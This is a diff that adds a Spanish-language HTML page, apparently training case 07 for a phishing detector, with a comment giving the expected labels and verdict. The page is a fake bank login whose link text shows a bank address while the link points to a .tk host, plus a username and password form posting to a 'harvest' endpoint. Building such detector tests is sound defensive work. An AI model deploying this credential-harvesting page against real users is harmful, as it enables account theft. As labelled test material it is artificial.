@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8"><title>Caso 07 — Enlace falso</title>
+<style>body{font-family:sans-serif;max-width:640px;margin:2rem auto;color:#333}</style></head>
+<body>
+<!-- TRAINING CASE 07 — fake-bank link + credential form. Expected:
+     [LINK_DESTINATION_MISMATCH, SUSPICIOUS_DOMAIN, CREDENTIAL_REQUEST,
+      IDENTITY_UNVERIFIED] -> link_spoofing -> warn / high.
+     The link text claims a bank domain; the href lands on a .tk host. -->
+<h1>Confirmación de acceso</h1>
+<p>Para continuar, entra a tu banca desde este enlace:</p>
+<p><a href="http://secure-verify.tk/login">https://www.tubanco-ficticio.test/acceso</a></p>
+<form action="http://secure-verify.tk/harvest" method="post">
+  <label>Usuario: <input type="text" name="u"></label>
+  <label>Clave: <input type="password" name="p"></label>
+  <button type="submit">Verificar</button>
+</form>
+</body></html>
